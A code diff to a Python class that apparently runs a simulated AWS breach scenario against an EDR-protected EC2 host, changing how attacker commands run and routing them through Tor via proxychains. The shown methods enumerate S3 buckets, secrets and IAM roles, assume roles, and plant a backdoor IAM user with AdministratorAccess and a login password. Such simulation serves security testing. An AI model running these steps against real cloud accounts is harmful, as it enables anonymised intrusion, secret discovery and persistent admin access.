@@ -67,7 +67,7 @@ class ScenarioExecution:
 
     def check_agent_connected(self):
         cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo /opt/traps/bin/cytool status"'
-        output = run_subprocess(cmdline, return_output=True, check=False)
+        output = run_subprocess(cmdline, check=False)
         edr_state = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
         if edr_state:
             edr_state = edr_state.group(1)
@@ -88,7 +88,7 @@ class ScenarioExecution:
 
         print(colored("Agent connected!", color="green"))
 
-    def attacker_run(self, cmdline, return_output=False, check=False):
+    def attacker_run(self, cmdline, return_errcode=False, check=False, use_tor=True):
         # Build the export string from the class state
         env_prefix = ""
         if self.attacker_env_vars:
@@ -96,13 +96,17 @@ class ScenarioExecution:
             env_prefix = " ".join([f"export {k}='{v}';" for k, v in self.attacker_env_vars.items()]) + " "
 
         # Prepend it to the user's command
-        full_remote_cmd = f"{env_prefix}{cmdline}"
+        if use_tor:
+            full_remote_cmd = f"{env_prefix} proxychains4 -q {cmdline}"
+        else:
+            full_remote_cmd = f"{env_prefix}{cmdline}"
 
         escaped_cmd = shlex.quote(full_remote_cmd)
 
         # Construct the SSH wrapper
         nested_cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} {escaped_cmd} 2>&1'
 
+        return_output = not return_errcode
         result = run_subprocess(nested_cmdline, return_output=return_output, check=check)
 
         # Sometimes connection is unstable and needs retries
@@ -116,7 +120,7 @@ class ScenarioExecution:
     def wait_for_attacker(self):
         tor_status_cmdline = "cat /home/ubuntu/tor_status.txt | grep successful"
 
-        tor_connected = self.attacker_run(tor_status_cmdline) == 0
+        tor_connected = self.attacker_run(tor_status_cmdline, return_errcode=True, use_tor=False) == 0
         time_waited = 0
         while not tor_connected:
             if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
@@ -125,11 +129,11 @@ class ScenarioExecution:
                 exit(1)
             sleep(CONNECTIVITY_CHECK_INTERVAL)
             time_waited += CONNECTIVITY_CHECK_INTERVAL
-            tor_connected = self.attacker_run(tor_status_cmdline) == 0
+            tor_connected = self.attacker_run(tor_status_cmdline, return_errcode=True, use_tor=False) == 0
 
     def attempt_recon(self):
         # List buckets
-        result = self.attacker_run('aws s3api list-buckets | jq ".Buckets[].Name"', return_output=True)
+        result = self.attacker_run('aws s3api list-buckets | jq ".Buckets[].Name"')
         if result.find("AccessDenied") == -1:
             self.discovered_buckets = [name.strip('"') for name in result.split()]
             print(colored(f"Buckets enumeration attempt discovered: {len(self.discovered_buckets)}", "red"))
@@ -137,7 +141,7 @@ class ScenarioExecution:
             print(colored("Buckets enumeration attempt failed", "red"))
 
         # List secrets
-        result = self.attacker_run('aws secretsmanager list-secrets | jq ".SecretList[].Name"', return_output=True)
+        result = self.attacker_run('aws secretsmanager list-secrets | jq ".SecretList[].Name"')
         if result.find("AccessDenied") == -1:
             self.discovered_secrets = [name.strip('"') for name in result.split()]
             print(colored(f"Secrets enumeration attempt discovered: {len(self.discovered_secrets)}", "red"))
@@ -145,7 +149,7 @@ class ScenarioExecution:
             print(colored("Secrets enumeration attempt failed", "red"))
 
         # List roles
-        result = self.attacker_run('aws iam list-roles | jq ".Roles[].Arn"', return_output=True)
+        result = self.attacker_run('aws iam list-roles | jq ".Roles[].Arn"')
         if result.find("AccessDenied") == -1:
             self.discovered_roles = [arn.strip('"') for arn in result.split()]
             print(colored(f"IAM roles enumeration attempt discovered {len(self.discovered_roles)} roles", "red"))
@@ -163,7 +167,7 @@ class ScenarioExecution:
     def attacker_assume_role(self, role_arn, session_name="DebuggingSession", update_env=True, check=True):
         cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --output json 2>&1"
 
-        output = self.attacker_run(cmd, return_output=True)
+        output = self.attacker_run(cmd)
 
         if output.find("AccessDenied") != -1:
             # Ensure success if flag requires it
@@ -195,16 +199,15 @@ class ScenarioExecution:
     def attempt_backdoor(self):
         # Create new user
         result = self.attacker_run(
-            f"aws iam create-user --user-name {self.backdoor_username} --tags Key=UC-OWNER,Value=Attacker",
-            return_output=True)
+            f"aws iam create-user --user-name {self.backdoor_username} --tags Key=UC-OWNER,Value=Attacker")
         if result.find("AccessDenied") != -1:
             print(colored("Failed to create new IAM user", "red"))
             return False
 
         # Attach admin policy
         result = self.attacker_run(
-            f"aws iam attach-user-policy --user-name {self.backdoor_username} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
-            return_output=True)
+            f"aws iam attach-user-policy --user-name {self.backdoor_username} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+        )
         if result.find("AccessDenied") != -1:
             print(colored("Failed to attach admin policy to new IAM user", "red"))
             return False
@@ -215,8 +218,7 @@ class ScenarioExecution:
         print(colored(f"Generated password for backdoor user {self.backdoor_username}:{generated_password}", "red"))
 
         reuslt = self.attacker_run(
-            f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}",
-            return_output=True)
+            f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}")
         if result.find("AccessDenied") != -1:
             print(colored("Failed to create login profile for new IAM user", "red"))
             return False
